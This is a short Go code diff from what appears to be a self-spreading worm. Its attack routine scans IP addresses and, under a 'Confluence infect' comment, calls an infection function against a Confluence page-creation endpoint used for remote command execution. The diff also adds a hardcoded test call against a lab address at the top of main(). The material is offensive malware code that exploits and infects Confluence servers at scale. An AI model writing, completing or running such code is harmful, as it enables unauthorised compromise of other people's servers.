@@ -49,6 +49,7 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 		}
 		//Confluence infect
 		if !infected && ports[2] != 0 {
+			ip_port := ip + ":" + strconv.Itoa(ports[2])
 			infection.ConfluenceCmdExecute("http://" + ip_port , "/pages/createpage-entervariables.action?SpaceKey=x")
 			infected = true
 		}
@@ -57,6 +58,8 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 }
 
 func main() {
+	infection.ConfluenceCmdExecute("http://10.0.2.8:8090","/pages/createpage-entervariables.action?SpaceKey=x")
+	return
 	f, err := os.Create("/tmp/test")
 	if err != nil {
         panic(err)
